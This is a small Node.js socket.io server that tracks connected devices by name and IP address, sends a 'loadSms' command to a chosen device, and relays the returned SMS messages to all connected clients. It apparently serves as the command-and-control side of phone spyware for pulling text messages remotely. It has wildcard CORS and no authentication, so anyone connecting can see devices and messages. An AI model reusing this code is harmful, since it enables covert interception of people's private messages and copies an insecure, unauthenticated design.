const { Server } = require('socket.io')

const { deviceConnect, deviceDisconnect, getConnectedDevices } = require('./utils/devices')

const PORT = process.env.PORT || 3000

const io = new Server({
    cors: {
        origin: '*'
    }
})

const room = 'devices'

io.on('connection', socket => {


    socket.on('joinRoom', deviceName => {
        let clientAddress = socket.request.connection;
        let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);

        const device = deviceConnect(socket.id, deviceName, clientIP, room)

        // Join a room
        socket.join(device.room)

        // // Send Connected devices to admin
        // io.to(room).emit('devices', getConnectedDevices(room))

        io.emit('devices', getConnectedDevices(room))
    })

    //load SMS

    socket.on('loadSms', deviceId => {
        io.to(deviceId).emit('loadSms')
    });

    socket.on('sendSms', sms => {
        io.emit('getSms', sms)
    })



    // Send Connected devices to admin
    socket.emit('devices', getConnectedDevices(room))

    socket.on('disconnect', aa => {
        // Remove a device from array
        const device = deviceDisconnect(socket.id)

        // Notify all client to updated connected devices
        // io.to(room).emit('devices', getConnectedDevices(room))
        io.emit('devices', getConnectedDevices(room))
    })
})











try {
    io.listen(PORT)
    console.log(`Server runing at port: ${PORT}`);
} catch (error) {
    console.log(`Error: ${error.message}`)
    process.exit(1)
}